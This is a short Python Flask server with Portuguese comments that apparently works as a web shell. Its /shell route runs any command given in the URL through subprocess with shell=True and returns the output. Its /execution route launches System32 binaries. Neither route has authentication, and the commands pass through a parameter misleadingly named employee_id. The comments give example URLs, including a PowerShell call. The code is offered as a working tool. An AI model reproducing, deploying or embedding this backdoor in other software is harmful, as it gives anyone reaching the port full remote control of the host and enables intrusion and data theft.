from flask import Flask, request
from flask_restful import Resource, Api
from json import dumps
from flask_jsonpify import jsonify
import subprocess
from funcoes import *

vazamento = {}
loadDados(vazamento)
app = Flask(__name__)
api = Api(app)

# Execução de comandos no terminal
#
# Para executar comandos com espaço basta adicionar "%20" no lugar dos espaços:
# Exemplo: http://localhost:4444/shell/powershell%20-c%20%22Write-Host%20'ola'%22

class Shell(Resource):
    def get(self, employee_id):
        try:
            mensagem = subprocess.check_output(employee_id, shell=True)
            mensagem = str(mensagem)
            print(mensagem)
            return mensagem
        except:
            print('Error')

#Execução de binários

#Para executar o binário ele deve estar na pasta C:\Windows\System32
#Exemplo: http://localhost:4444/execution/control.exe

class Execution(Resource):
    def get(self, employee_id):
        try:
            #program = employee_id
            #program = str(program)
            mensagem = subprocess.call([employee_id])
            print(mensagem)
            return mensagem
        except:
            print("Error")

api.add_resource(Shell, '/shell/<employee_id>')
api.add_resource(Execution, '/execution/<employee_id>')

if __name__ == '__main__':
     app.run(port='4444')